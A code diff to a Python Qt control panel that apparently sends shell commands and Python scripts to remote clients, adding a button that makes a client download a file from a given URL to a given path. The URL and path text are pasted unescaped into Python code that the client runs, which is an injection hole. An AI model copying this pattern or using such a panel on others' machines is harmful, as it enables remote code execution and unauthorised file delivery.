@@ -241,6 +241,11 @@ ui.sendCommandButton.clicked.connect(lambda: client.trigger('admin-' + client_id
                                                             ui.commandBox.text()))
 ui.execPythonButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'python',
                                                            ui.pythonScriptEditor.toPlainText()))
+ui.downloadButton.clicked.connect(lambda: client.trigger('admin-' + str(client_id), 'python', f"""
+log("Downloading")
+daun.download("{ui.downloadUrl.text()}", "{ui.pathToFileDownload.text()}")
+log("Downloaded {ui.downloadUrl.text()} to {ui.pathToFileDownload.text()}")
+"""))
 
 # Handling closing of the window to exit whole program
 sys.exit(app.exec_())
